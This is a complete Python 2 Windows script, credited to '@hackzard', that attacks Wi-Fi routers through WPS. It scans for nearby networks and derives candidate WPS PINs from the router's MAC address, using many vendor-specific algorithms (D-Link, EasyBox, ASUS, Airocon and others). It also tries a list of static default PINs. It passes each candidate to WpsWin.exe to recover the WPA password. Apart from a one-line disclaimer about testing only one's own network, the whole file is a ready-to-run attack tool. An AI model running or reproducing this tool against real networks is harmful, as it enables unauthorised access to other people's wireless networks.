#!/usr/bin/python2
# -- coding: cp866 --

import math
import re
import subprocess
import sys
from time import sleep

import asadmin

network = 0
wpserrors = 0

if not asadmin.isUserAdmin():
    print("Starting as Administrator...")
    asadmin.runAsAdmin()
    sys.exit()


def run_command(command):
    p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         shell=True)
    for LINE in iter(p.stdout.readline, b''):
        if LINE:
            yield LINE
    while p.poll() is None:
        sleep(.1)
    err = p.stderr.read()
    if p.returncode != 0:
        print "" + err


def checksum(p_i_n):
    p_i_n %= 10000000
    a = 0
    t = p_i_n
    while t:
        a += 3 * (t % 10)
        t = math.floor(t / 10)
        a += t % 10
        t = math.floor(t / 10)
    return (p_i_n * 10) + ((10 - (a % 10)) % 10)


def fill(number, width):
    _PIN = str(number)
    while len(_PIN.replace('.', '')) < width:
        _PIN = '0%s' % _PIN
    return _PIN


def reverse(this_str):
    return this_str[::-1]


def checkwps():
    global wpserrors
    if wpserrors > 2:
        print ("\nOops! It seems that the connection with this wireless network can't be established by WPS")
        sleep(5)
        raw_input()
        sys.exit()


def checkblock():
    global wpserrors
    print('\nAP blocks our requests. Maybe WAF?\nERROR: Timeout error')
    subprocess.call("taskkill /f /IM WpsWin.exe")
    wpserrors += 1


def connect(name, key):
    import threading
    global wpserrors
    t = threading.Timer(15.0, checkblock)
    t.start()
    global wpserrors
    command = 'WpsWin.exe Action=Registrar ESSID="%s" PIN=%s' % (name, str(key))
    sleep(1)
    for LINE in run_command(command):
        if "Asociacion fallida" in LINE:
            print "Connection with %s hasn't been established!" % name
            wpserrors += 1
            t.cancel()
            return
        elif "Pin incorrecto" in LINE:
            print("Pin invalid!")
            t.cancel()
            wpserrors = 0
            return
        elif "Wpa Key" in LINE:
            import winsound
            t.cancel()
            print("\nTRUE PIN FOUND!\nGetting the Wi-Fi password...\n")
            winsound.Beep(1500, 1000)
            print(LINE)
            sleep(5)
            raw_input()
            sys.exit()


print
print(u"╦ ╦╔═╗╔═╗┌─┐┬ ┬┌─┐┌─┐")
print(u"║║║╠═╝╚═╗├┤ └┬┘├┤ └─┐")
print(u"╚╩╝╩  ╚═╝└─┘ ┴ └─┘└─┘")
print("Author: @hackzard")
print("Russia, January 2017")
print
print("Please don't use this script to hack private wireless networks.\n")
print("Use it ONLY for the analysis of the security of your own Wi-Fi or by joint agreement.\n")

results = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"])
results = results.replace("\r", "")
ls = results.split("\n")
ls = ls[4:]
ssids = []
bssids = []
for line in ls:
    if "BSSID" in line:
        bssids.append(re.sub('BSSID [\d]+:', '', line.strip()).strip())
    elif "SSID" in line:
        ssids.append(re.sub('SSID [\d]+:', '', line.strip()).strip())

i = 0
print ("Available wireless networks at the moment:\n")
for j in ssids:
    i += 1
    print "%d - %s" % (i, j)
while (network == "") or (int(network) < 1) or (int(network) > i):
    print
    network = raw_input("Choose the wireless network > ")
network = int(network) - 1
macbssid = bssids[network].upper()
mac = macbssid.replace(":", "").replace("-", "").replace(" ", "").replace(".", "")

# ------------------#
# --- TECHNIQUES ---#
# -------------------#

wifiname = ssids[network]

checkwps()
print "\nTrying connect to %s via [Technique pin24]" % macbssid
pina = fill(int(checksum(int(mac, 16) & 0xFFFFFF)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin28]" % macbssid
pina = fill(int(checksum(int(mac, 16) & 0xFFFFFFF)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin32]" % macbssid
pina = fill(int(checksum(int(mac, 16) % 0x100000000)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin36]" % macbssid
pina = fill(int(checksum(int(mac, 16) % 0x1000000000)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin40]" % macbssid
pina = fill(int(checksum(int(mac, 16) % 0x10000000000)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin44]" % macbssid
pina = fill(int(checksum(int(mac, 16) % 0x100000000000)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin48]" % macbssid
pina = fill(int(checksum(int(mac, 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin24rh]" % macbssid
pina = fill(format(int(mac, 16) & 0xFFFFFF, '02x'), 6)
pina = fill(int(checksum(int(pina[4:6] + pina[2:4] + pina[0:2], 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin32rh]" % macbssid
pina = fill(format(int(mac, 16) % 0x100000000, '02x'), 8)
pina = fill(int(checksum(int(pina[6:8] + pina[4:6] + pina[2:4] + pina[0:2], 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin48rh]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
pina = fill(
    int(checksum(int(pina[10:12] + pina[8:10] + pina[6:8] + pina[4:6] + pina[2:4] + pina[0:2], 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin24rn]" % macbssid
pina = fill(
    int(checksum(int(reverse(fill(format(int(mac, 16) & 0xFFFFFF, '02x'), 6)), 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin32rn]" % macbssid
pina = fill(
    int(checksum(int(reverse(fill(format(int(mac, 16) % 0x100000000, '02x'), 8)), 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin48rn]" % macbssid
pina = fill(int(checksum(int(reverse(fill(format(int(mac, 16), '02x'), 12)), 16))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin24rb]" % macbssid
pina = fill(
    int(checksum(int(reverse(fill(str(bin(int(mac, 16) & 0xFFFFFF))[2:], 24)), 2))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin32rb]" % macbssid
pina = fill(
    int(checksum(int(reverse(fill(str(bin(int(mac, 16) % 0x100000000))[2:], 32)), 2))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pin48rb]" % macbssid
pina = fill(int(checksum(int(reverse(fill(str(bin(int(mac, 16)))[2:], 48)), 2))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinDLink]" % macbssid
pina = (int(mac, 16) & 0xFFFFFF) ^ 0x55AA55
pina ^= ((pina & 0xF) << 4) | ((pina & 0xF) << 8) | ((pina & 0xF) << 12) | ((pina & 0xF) << 16) | ((pina & 0xF) << 20)
pina %= 10000000
if pina < 1000000:
    pina += ((pina % 9) * 1000000) + 1000000
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinDLinkInc1]" % macbssid
pina = ((int(mac, 16) + 1) & 0xFFFFFF) ^ 0x55AA55
pina ^= ((pina & 0xF) << 4) | ((pina & 0xF) << 8) | ((pina & 0xF) << 12) | ((pina & 0xF) << 16) | ((pina & 0xF) << 20)
pina %= 10000000
if pina < 1000000:
    pina += ((pina % 9) * 1000000) + 1000000
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinEasyBox]" % macbssid
pina = int(mac, 16)
sn = fill(int(pina & 0xFFFF), 5)
k1 = (int(sn[1]) + int(sn[2]) + ((pina & 0xFF) >> 4) + (pina & 0xF)) & 0xF
k2 = (int(sn[3]) + int(sn[4]) + ((pina & 0xFFFF) >> 12) + ((pina & 0xFFF) >> 8)) & 0xF
hpin = [k1 ^ int(sn[4]), k1 ^ int(sn[3]), k2 ^ ((pina & 0xFFF) >> 8), k2 ^ ((pina & 0xFF) >> 4),
        ((pina & 0xFF) >> 4) ^ int(sn[4]), (pina & 0xF) ^ int(sn[3]), k1 ^ int(sn[2])]
HEX = ""
for i in hpin:
    HEX += format(i, 'x')
pina = int(HEX, 16)
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinASUS]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
b = [int(pina[0:2], 16), int(pina[2:4], 16), int(pina[4:6], 16), int(pina[6:8], 16),
     int(pina[8:10], 16), int(pina[10:12], 16)]
pin = []
for i in range(7):
    pin.append((b[i % 6] + b[5]) % (10 - ((i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)))
pina = fill(int(checksum(int(''.join(str(i) for i in pin), 10))), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinAirocon]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
b = [int(pina[0:2], 16), int(pina[2:4], 16), int(pina[4:6], 16), int(pina[6:8], 16),
     int(pina[8:10], 16), int(pina[10:12], 16)]
pina = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) + (
    ((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) + (((b[1] + b[2]) % 10) * 100000) + (
           ((b[0] + b[1]) % 10) * 1000000)
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinInvNIC]" % macbssid
pina = fill(int(checksum(~(int(mac, 16) & 0xFFFFFF) & 0xFFFFFF)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinNIC2]" % macbssid
pina = fill(int(checksum((int(mac, 16) & 0xFFFFFF) * 2)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinNIC3]" % macbssid
pina = fill(int(checksum((int(mac, 16) & 0xFFFFFF) * 3)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinOUIaddNIC]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
oui = int(pina[0:6], 16)
nic = int(pina[6:12], 16)
pina = (oui + nic) % 0x1000000
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinOUIsubNIC]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
oui = int(pina[0:6], 16)
nic = int(pina[6:12], 16)
if nic < oui:
    pina = oui - nic
else:
    pina = (oui + 0x1000000 - nic) & 0xFFFFFF
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Technique pinOUIxorNIC]" % macbssid
pina = fill(format(int(mac, 16), '02x'), 12)
oui = int(pina[0:6], 16)
nic = int(pina[6:12], 16)
pina = oui ^ nic
pina = fill(int(checksum(pina)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
print "\nTrying connect to %s via [Static techniques]" % macbssid
pina = fill(int(checksum(1234567)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(2017252)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(4626484)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(7622990)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(6232714)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(6817554)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(9566146)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(2085483)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(4397768)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(529417)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(9995604)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(3561153)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(6795814)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = fill(int(checksum(3425928)), 8)
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

checkwps()
pina = "12345678"
print ("Checking pin: " + pina + "...")
connect(wifiname, pina)

print("\n\nUnfortunately, pick up a PIN to this AP failed\n")
sleep(5)
raw_input()

# ------------------#
# --- TECHNIQUES ---#
# -------------------#
